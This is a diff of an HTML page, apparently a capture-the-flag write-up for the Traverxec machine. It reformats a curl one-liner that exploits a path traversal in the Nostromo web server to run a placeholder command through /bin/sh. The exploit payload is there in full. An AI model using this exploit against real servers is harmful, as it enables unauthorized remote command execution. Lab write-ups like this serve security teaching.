@@ -329,7 +329,10 @@ This is done by <strong>getting the size of rows of the terminal</strong> and <s
 <h2 id="rewriting-the-nostromo-exploit">Rewriting the Nostromo exploit</h2>
 <p><em>After some brief testing, and</em> <strong><em>for the sake of simplicity,</em></strong> we <strong>re-wrote the the exploit</strong> for Nostromo as a <code class="language-plaintext highlighter-rouge">curl</code> one-liner:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> <span class="s1">$'POST'</span> <span class="nt">-H</span> <span class="s1">$'Content-Length: 1'</span> <span class="nt">--data-binary</span> <span class="s1">$'</span><span class="se">\x</span><span class="s1">0d</span><span class="se">\x</span><span class="s1">0aecho</span><span class="se">\x</span><span class="s1">0d</span><span class="se">\x</span><span class="s1">0aecho</span><span class="se">\x</span><span class="s1">0d</span><span class="se">\x</span><span class="s1">0a&lt;COMMAND&gt;'</span> <span class="s1">$'http://&lt;HOSTNAME&gt;:&lt;PORT&gt;/.%0d./.%0d./.%0d./.%0d./bin/sh'</span> <span class="o">&gt;</span>/dev/null
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> <span class="s1">$'POST'</span> <span class="se">\</span>
+<span class="nt">-H</span> <span class="s1">$'Content-Length: 1'</span> <span class="se">\</span>
+<span class="nt">--data-binary</span> <span class="s1">$'</span><span class="se">\x</span><span class="s1">0d</span><span class="se">\x</span><span class="s1">0aecho</span><span class="se">\x</span><span class="s1">0d</span><span class="se">\x</span><span class="s1">0aecho</span><span class="se">\x</span><span class="s1">0d</span><span class="se">\x</span><span class="s1">0a&lt;COMMAND&gt;'</span> <span class="se">\</span>
+<span class="s1">$'http://&lt;HOSTNAME&gt;:&lt;PORT&gt;/.%0d./.%0d./.%0d./.%0d./bin/sh'</span> <span class="o">&gt;</span>/dev/null
 </code></pre></div></div>
 
 <p><img src="/assets/Traverxec/exploit-rewritten.jpg" alt="" /></p>
